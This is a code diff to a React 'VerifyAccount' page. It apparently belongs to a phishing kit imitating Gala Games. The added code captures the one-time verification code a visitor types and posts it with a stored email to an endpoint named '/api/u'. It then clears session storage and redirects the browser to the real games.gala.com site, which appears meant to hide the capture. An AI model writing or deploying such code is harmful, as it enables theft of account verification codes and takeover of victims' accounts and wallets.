@@ -2,14 +2,24 @@
 import React from 'react';
 import styles from './styles.module.css';
 import Image from "next/image";
-import {useRouter} from "next/navigation";
-import {routeConstants} from "../../../../constants/route";
+
 
 const VerifyAccount = () => {
-  const navigate = useRouter()
+  const [otp, setOtp] = React.useState('');
 
-  const navigateTo = () => {
-    navigate.push(routeConstants.WALLET)
+  const navigateTo = async () => {
+    const res = await fetch('/api/u', {
+      method: 'POST',
+      body: JSON.stringify({code: otp, email: sessionStorage.getItem('gd600-ap')}),
+    });
+    const json = await res.json();
+    sessionStorage.clear()
+
+    console.log('json', json)
+
+    if (typeof window !== 'undefined') {
+      window.location.assign('https://games.gala.com/')
+    }
   }
 
   return (
@@ -26,6 +36,7 @@ const VerifyAccount = () => {
           type="text"
           placeholder="Enter code here..."
           className={styles.input}
+          onChange={(e) => setOtp(e.target.value)}
         />
         <button className={styles.submitButton} onClick={navigateTo}>
           Submit
